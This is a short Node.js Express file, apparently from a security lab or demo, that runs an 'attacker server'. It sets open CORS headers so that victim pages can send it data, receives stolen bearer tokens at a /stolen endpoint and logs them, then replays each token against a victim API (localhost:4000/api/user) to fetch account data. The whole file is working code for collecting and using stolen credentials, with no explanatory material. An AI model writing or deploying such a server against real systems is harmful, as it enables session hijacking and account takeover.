const express = require('express');
const axios = require('axios');
const app = express();
const PORT = 9000;

// allow requests from all origins (victim's server)
app.use((req, res, next) => {
  res.header("Access-Control-Allow-Origin", "*");
  res.header("Access-Control-Allow-Methods", "GET,POST,OPTIONS");
  res.header("Access-Control-Allow-Headers", "Content-Type, Authorization");
  if (req.method === 'OPTIONS') return res.sendStatus(200);
  next();
});

app.use(express.json());


app.post('/stolen', async (req, res) => {
  const { token, source } = req.body;
  console.log(`Received token from ${source}:`, token);

  if (!token) {
    console.log('No token received');
    return res.sendStatus(400);
  }

  const headers = {
    Authorization: `Bearer ${token}`
  };

  try {
    // making a request to the victim's server with the stolen token
    const userRes = await axios.get('http://localhost:4000/api/user', { headers });
    console.log(`User Info:`, userRes.data);
  } catch (err) {
    console.log(`Failed to get /api/user:`, err.response?.status, err.response?.data || err.message);
  }
  res.sendStatus(200);
});

app.listen(PORT, () => {
  console.log(`Attacker server listening on http://localhost:${PORT}`);
});
